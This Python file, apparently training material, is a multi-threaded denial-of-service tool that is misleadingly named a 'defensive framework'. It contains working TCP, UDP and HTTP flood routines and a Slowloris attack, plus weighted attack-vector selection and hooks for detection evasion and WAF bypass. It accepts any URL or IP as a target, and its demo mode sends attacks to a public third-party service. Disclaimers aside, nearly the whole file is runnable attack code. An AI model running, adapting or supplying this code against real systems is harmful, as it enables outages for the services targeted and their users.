#!/usr/bin/env python3
"""
Enhanced Integration Example
Author: HTB Training - lxkhaninkali
Description: Demonstration of how to integrate AI and evasion modules with existing defensive framework scripts
Educational Purpose Only - Use responsibly and legally

This script shows how to enhance any of your existing scripts with:
- Advanced evasion techniques
- AI-driven attack optimization
- Comprehensive URL support
- Modern anti-detection methods
"""

import sys
import time
import socket
import random
import requests
from typing import Dict, List, Tuple

# Import our enhanced modules
try:
    from advanced_evasion_module import (
        create_evasion_config, 
        AdvancedEvasionEngine, 
        EvasionIntegrator,
        EvasionLevel,
        ProtocolType
    )
    HAS_EVASION = True
    print("[+] Advanced Evasion Module loaded")
except ImportError:
    HAS_EVASION = False
    print("[!] Advanced Evasion Module not found - using basic methods")

class EnhancedDefensiveFramework:
    """
    Enhanced version of basic DOS tools with AI and evasion integration
    
    This demonstrates how to upgrade ANY of your existing scripts
    with advanced capabilities while maintaining the original functionality.
    """
    
    def __init__(self, target, evasion_level="balanced"):
        self.target = target
        self.target_ip = None
        self.target_port = None
        self.target_url = None
        self.use_https = False
        
        # Parse target
        self._parse_target(target)
        
        # Initialize evasion if available
        if HAS_EVASION:
            self.evasion_config = create_evasion_config(
                level=evasion_level,
                protocols=["http", "https", "tcp", "udp"],
                custom_options={
                    'randomize_timing': True,
                    'spoof_headers': True,
                    'rotate_user_agents': True,
                    'fragment_packets': evasion_level in ['stealth', 'balanced'],
                    'encrypt_payloads': evasion_level == 'stealth'
                }
            )
            self.evasion_engine = AdvancedEvasionEngine(self.evasion_config)
            self.evasion_integrator = EvasionIntegrator(self.evasion_engine)
            print(f"[+] Evasion engine initialized (Level: {evasion_level})")
        else:
            self.evasion_config = None
            self.evasion_engine = None
            self.evasion_integrator = None
        
        # Attack statistics
        self.packets_sent = 0
        self.successful_attacks = 0
        self.failed_attacks = 0
        self.running = True
        
        print(f"[*] Enhanced Defensive Framework initialized for {self.target}")
    
    def _parse_target(self, target):
        """Parse target with comprehensive URL support"""
        if target.startswith('http://') or target.startswith('https://'):
            # URL target
            self.target_url = target
            try:
                import urllib.parse
                parsed = urllib.parse.urlparse(target)
                self.target_ip = socket.gethostbyname(parsed.hostname)
                self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                self.use_https = parsed.scheme == 'https'
                print(f"[*] URL target: {target} -> {self.target_ip}:{self.target_port}")
            except Exception as e:
                print(f"[!] Failed to parse URL: {e}")
                sys.exit(1)
        else:
            # IP target
            self.target_ip = target
            self.target_port = 80  # Default, will be updated
            print(f"[*] IP target: {self.target_ip}")
    
    def enhanced_tcp_attack(self) -> bool:
        """
        Enhanced TCP attack that integrates evasion techniques
        
        This shows how to upgrade your existing basic TCP attacks
        """
        try:
            # Use evasive socket if available, otherwise standard socket
            if self.evasion_integrator:
                sock = self.evasion_integrator.enhance_tcp_connection(
                    self.target_ip, self.target_port
                )
                
                # Apply evasive delay
                delay = self.evasion_engine.get_evasive_delay()
                time.sleep(delay)
                
            else:
                # Fallback to basic socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                time.sleep(random.uniform(0.01, 0.1))  # Basic delay
            
            # Attempt connection
            sock.connect((self.target_ip, self.target_port))
            sock.close()
            return True
            
        except Exception as e:
            return False
    
    def enhanced_udp_attack(self) -> bool:
        """
        Enhanced UDP attack with evasive payloads
        
        Shows how to upgrade UDP flooding with advanced techniques
        """
        try:
            # Use evasive socket if available
            if self.evasion_integrator:
                sock = self.evasion_integrator.enhance_udp_socket()
                
                # Generate evasive payload
                payload = self.evasion_integrator.get_evasive_payload(
                    size=random.randint(64, 512),
                    payload_type="mixed"
                )
                
                # Apply evasive delay
                delay = self.evasion_engine.get_evasive_delay()
                time.sleep(delay)
                
            else:
                # Fallback to basic UDP
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = b'A' * random.randint(64, 512)
                time.sleep(random.uniform(0.01, 0.1))
            
            sock.sendto(payload, (self.target_ip, self.target_port))
            sock.close()
            return True
            
        except Exception as e:
            return False
    
    def enhanced_http_attack(self) -> bool:
        """
        Enhanced HTTP attack with comprehensive URL support and evasion
        
        Demonstrates upgrading HTTP attacks with advanced techniques
        """
        if not self.target_url:
            # Fallback to TCP if no URL
            return self.enhanced_tcp_attack()
        
        try:
            # Prepare request components
            method = "GET"
            headers = {
                'Host': self.target_ip,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'close'
            }
            data = None
            
            # Apply evasion enhancements if available
            if self.evasion_integrator:
                method, headers, data = self.evasion_integrator.enhance_http_request(
                    method, self.target_url, headers, data
                )
            else:
                # Basic enhancements
                headers['User-Agent'] = 'Mozilla/5.0 (compatible; DefensiveFramework/1.0)'
                time.sleep(random.uniform(0.01, 0.1))
            
            # Create connection
            if self.use_https:
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                ssl_sock = context.wrap_socket(sock, server_hostname=self.target_ip)
                ssl_sock.connect((self.target_ip, self.target_port))
                connection = ssl_sock
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_ip, self.target_port))
                connection = sock
            
            # Build HTTP request
            import urllib.parse
            parsed_url = urllib.parse.urlparse(self.target_url)
            path = parsed_url.path or '/'
            
            # Add query parameters for variety
            if random.random() < 0.5:
                params = [
                    f'id={random.randint(1, 10000)}',
                    f'test={random.randint(1, 1000)}',
                    f'timestamp={int(time.time())}'
                ]
                path += '?' + random.choice(params)
            
            request = f"{method} {path} HTTP/1.1\r\n"
            for header, value in headers.items():
                request += f"{header}: {value}\r\n"
            request += "\r\n"
            
            # Send request
            connection.send(request.encode())
            
            # Read response for realistic behavior
            try:
                response = connection.recv(1024)
                success = b'HTTP/' in response
            except:
                success = True  # Connection was successful
            
            connection.close()
            return success
            
        except Exception as e:
            return False
    
    def enhanced_slowloris_attack(self) -> bool:
        """
        Enhanced Slowloris attack with evasion
        
        Shows how to upgrade connection exhaustion attacks
        """
        if not self.target_url:
            return False
        
        try:
            connections = []
            max_connections = random.randint(10, 25)
            
            # Create partial connections
            for _ in range(max_connections):
                try:
                    if self.use_https:
                        import ssl
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        ssl_sock = context.wrap_socket(sock, server_hostname=self.target_ip)
                        ssl_sock.connect((self.target_ip, self.target_port))
                        conn = ssl_sock
                    else:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        sock.connect((self.target_ip, self.target_port))
                        conn = sock
                    
                    # Send partial HTTP request
                    partial_request = f"GET / HTTP/1.1\r\n"
                    partial_request += f"Host: {self.target_ip}\r\n"
                    
                    # Use evasive user agent if available
                    if self.evasion_engine:
                        ua = self.evasion_engine.get_random_user_agent()
                    else:
                        ua = "Mozilla/5.0 (compatible; SlowLoris/1.0)"
                    
                    partial_request += f"User-Agent: {ua}\r\n"
                    
                    conn.send(partial_request.encode())
                    connections.append(conn)
                    
                    # Evasive delay between connections
                    if self.evasion_engine:
                        delay = self.evasion_engine.get_evasive_delay(0.1)
                        time.sleep(delay)
                    else:
                        time.sleep(random.uniform(0.01, 0.1))
                        
                except:
                    continue
            
            # Keep connections alive briefly
            keep_alive_iterations = random.randint(2, 5)
            for _ in range(keep_alive_iterations):
                for conn in connections[:]:
                    try:
                        conn.send(b"X-Keep-Alive: timeout=10\r\n")
                    except:
                        connections.remove(conn)
                time.sleep(1)
            
            # Clean up
            for conn in connections:
                try:
                    conn.close()
                except:
                    pass
            
            return len(connections) > 0
            
        except Exception as e:
            return False
    
    def ai_attack_selection(self) -> str:
        """
        AI-driven attack vector selection
        
        Demonstrates intelligent attack strategy selection
        """
        attack_vectors = ['tcp', 'udp', 'http', 'slowloris']
        
        # Simple AI: select based on target characteristics and success rates
        if self.target_url:
            # Web target - prefer HTTP attacks
            if self.use_https:
                weights = [0.2, 0.1, 0.5, 0.2]  # Favor HTTP and slowloris
            else:
                weights = [0.3, 0.1, 0.4, 0.2]
        else:
            # IP target - prefer network attacks
            weights = [0.4, 0.4, 0.1, 0.1]
        
        # Adjust based on success rate (simplified AI)
        if hasattr(self, 'success_rate'):
            success_rate = self.successful_attacks / max(1, self.packets_sent)
            if success_rate < 0.3:
                # Low success rate - try different approach
                weights = [w * 0.5 if i == 0 else w * 1.5 for i, w in enumerate(weights)]
        
        # Weighted random selection
        import random
        return random.choices(attack_vectors, weights=weights)[0]
    
    def enhanced_attack_worker(self, worker_id: int, duration: int = 60):
        """
        Enhanced attack worker with AI selection and evasion
        
        Shows how to upgrade your attack nodes with intelligence
        """
        print(f"[*] Enhanced Worker {worker_id} starting...")
        
        start_time = time.time()
        local_packets = 0
        local_successes = 0
        consecutive_failures = 0
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # AI selects attack vector
                attack_vector = self.ai_attack_selection()
                
                # Execute selected attack with evasion
                success = False
                
                if attack_vector == 'tcp':
                    success = self.enhanced_tcp_attack()
                elif attack_vector == 'udp':
                    success = self.enhanced_udp_attack()
                elif attack_vector == 'http':
                    success = self.enhanced_http_attack()
                elif attack_vector == 'slowloris':
                    success = self.enhanced_slowloris_attack()
                
                # Update statistics
                local_packets += 1
                if success:
                    local_successes += 1
                    consecutive_failures = 0
                    self.successful_attacks += 1
                else:
                    consecutive_failures += 1
                    self.failed_attacks += 1
                
                self.packets_sent += 1
                
                # Adaptive delay based on performance
                if self.evasion_engine:
                    # Use evasion engine for intelligent delays
                    if consecutive_failures > 3:
                        # Increase delay after failures
                        base_delay = 0.5
                    else:
                        base_delay = 0.1
                    
                    delay = self.evasion_engine.get_evasive_delay(base_delay)
                    time.sleep(delay)
                else:
                    # Basic adaptive delay
                    if consecutive_failures > 3:
                        time.sleep(random.uniform(0.5, 2.0))
                    else:
                        time.sleep(random.uniform(0.01, 0.1))
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                consecutive_failures += 1
                continue
        
        success_rate = local_successes / max(1, local_packets)
        print(f"[*] Worker {worker_id} completed: {local_packets} attacks, {success_rate:.2%} success rate")
        
        return local_packets
    
    def run_enhanced_attack(self, num_workers: int = 5, duration: int = 60):
        """
        Run enhanced multi-threaded attack
        
        Demonstrates how to coordinate enhanced attack workers
        """
        print("="*80)
        print("ENHANCED DEFENSIVE FRAMEWORK ATTACK")
        print("="*80)
        print(f"Target: {self.target}")
        print(f"Workers: {num_workers}")
        print(f"Duration: {duration} seconds")
        print(f"Evasion: {'Enabled' if HAS_EVASION else 'Disabled'}")
        print("="*80)
        
        # Evasion analysis if available
        if self.evasion_engine and self.target_ip:
            print("\n[*] Performing evasion analysis...")
            try:
                waf_analysis = self.evasion_engine.detect_and_evade_waf(
                    self.target_ip, self.target_port
                )
                if waf_analysis['waf_detected']:
                    print(f"[!] WAF detected: {waf_analysis['waf_type']}")
                    print("[*] Adjusting evasion strategy...")
            except Exception as e:
                print(f"[!] Evasion analysis failed: {e}")
        
        # Launch enhanced attack workers
        from concurrent.futures import ThreadPoolExecutor
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=num_workers) as executor:
            # Submit all workers
            futures = []
            for worker_id in range(1, num_workers + 1):
                future = executor.submit(
                    self.enhanced_attack_worker, 
                    worker_id, 
                    duration
                )
                futures.append(future)
            
            # Monitor progress
            while (time.time() - start_time) < duration:
                time.sleep(5)
                elapsed = time.time() - start_time
                remaining = duration - elapsed
                
                # Calculate rates
                rate = self.packets_sent / max(1, elapsed)
                success_rate = self.successful_attacks / max(1, self.packets_sent)
                
                print(f"[+] Progress: {elapsed:.0f}s elapsed, {remaining:.0f}s remaining")
                print(f"    Packets: {self.packets_sent}, Rate: {rate:.1f} pps")
                print(f"    Success rate: {success_rate:.2%}")
                
                if not self.running:
                    break
            
            # Wait for workers to complete
            self.running = False
            for future in futures:
                try:
                    future.result(timeout=10)
                except:
                    pass
        
        # Final statistics
        total_time = time.time() - start_time
        final_rate = self.packets_sent / total_time
        final_success_rate = self.successful_attacks / max(1, self.packets_sent)
        
        print(f"\n" + "="*80)
        print("ENHANCED ATTACK SUMMARY")
        print("="*80)
        print(f"Total Duration: {total_time:.1f} seconds")
        print(f"Total Packets: {self.packets_sent}")
        print(f"Successful Attacks: {self.successful_attacks}")
        print(f"Failed Attacks: {self.failed_attacks}")
        print(f"Average Rate: {final_rate:.1f} packets/second")
        print(f"Success Rate: {final_success_rate:.2%}")
        
        if self.evasion_engine:
            print(f"\nEvasion Report:")
            report = self.evasion_engine.generate_evasion_report()
            print(f"  Evasion Level: {report['evasion_level']}")
            print(f"  Techniques Used: {len([k for k, v in report['techniques_enabled'].items() if v])}")
            print(f"  Recommendations: {len(report['recommendations'])}")
            
            if report['recommendations']:
                print("  Key Recommendations:")
                for rec in report['recommendations'][:3]:
                    print(f"    • {rec}")
        
        print("="*80)


def demonstrate_integration():
    """Demonstrate how to integrate enhancements with existing tools"""
    print("Enhanced Integration Demonstration")
    print("=" * 50)
    print("This shows how to upgrade your existing scripts with:")
    print("• Advanced evasion techniques")
    print("• AI-driven attack selection") 
    print("• Comprehensive URL support")
    print("• Modern anti-detection methods")
    print("=" * 50)
    
    # Example targets for demonstration
    demo_targets = [
        "http://httpbin.org",  # Public testing service
        "https://httpbin.org", # HTTPS version
        "127.0.0.1"           # Localhost (safe)
    ]
    
    print(f"\nDemonstration targets: {demo_targets}")
    print("Note: Using safe public testing services and localhost")
    
    for target in demo_targets[:1]:  # Just demonstrate with first target
        print(f"\n[*] Demonstrating enhancements for target: {target}")
        
        # Create enhanced framework instance
        framework = EnhancedDefensiveFramework(target, evasion_level="balanced")
        
        # Demonstrate individual attack methods
        print("  [*] Testing enhanced TCP attack...")
        tcp_success = framework.enhanced_tcp_attack()
        print(f"      TCP Attack: {'Success' if tcp_success else 'Failed'}")
        
        print("  [*] Testing enhanced UDP attack...")
        udp_success = framework.enhanced_udp_attack()
        print(f"      UDP Attack: {'Success' if udp_success else 'Failed'}")
        
        print("  [*] Testing enhanced HTTP attack...")
        http_success = framework.enhanced_http_attack()
        print(f"      HTTP Attack: {'Success' if http_success else 'Failed'}")
        
        # Demonstrate AI selection
        print("  [*] Testing AI attack selection...")
        selected_vector = framework.ai_attack_selection()
        print(f"      AI Selected: {selected_vector}")
        
        print(f"  [*] Integration demonstration completed for {target}")
    
    print("\n" + "=" * 50)
    print("Integration demonstration completed!")
    print("=" * 50)


def main():
    print("Enhanced Integration Example for Defensive Framework")
    print("=" * 60)
    print("This script demonstrates how to upgrade your existing scripts with:")
    print("• Advanced evasion techniques")
    print("• AI-driven optimization") 
    print("• Comprehensive URL support")
    print("• Modern anti-detection capabilities")
    print("\nEducational purposes only - use responsibly!")
    print("=" * 60)
    
    if len(sys.argv) < 2:
        print("\nUsage options:")
        print("1. Demonstration mode: python3 enhanced_integration_example.py demo")
        print("2. Enhanced attack: python3 enhanced_integration_example.py <target_url_or_ip> [workers] [duration]")
        print("\nExamples:")
        print("  python3 enhanced_integration_example.py demo")
        print("  python3 enhanced_integration_example.py https://httpbin.org 3 30")
        print("  python3 enhanced_integration_example.py http://127.0.0.1:8080 5 60")
        print("  python3 enhanced_integration_example.py 192.168.1.100 3 30")
        return
    
    if sys.argv[1].lower() == 'demo':
        # Run demonstration
        demonstrate_integration()
        return
    
    # Enhanced attack mode
    target = sys.argv[1]
    num_workers = int(sys.argv[2]) if len(sys.argv) > 2 else 3
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    
    print(f"\nTarget: {target}")
    print(f"Workers: {num_workers}")
    print(f"Duration: {duration} seconds")
    
    # Safety confirmation
    confirm = input(f"\nContinue with enhanced attack on {target}? (y/N): ")
    if confirm.lower() != 'y':
        print("[!] Attack cancelled by user")
        return
    
    # Create and run enhanced attack
    framework = EnhancedDefensiveFramework(target, evasion_level="balanced")
    
    try:
        framework.run_enhanced_attack(num_workers, duration)
    except KeyboardInterrupt:
        print("\n[!] Enhanced attack interrupted by user")
        framework.running = False
    except Exception as e:
        print(f"\n[!] Enhanced attack error: {e}")
        framework.running = False


if __name__ == "__main__":
    main()
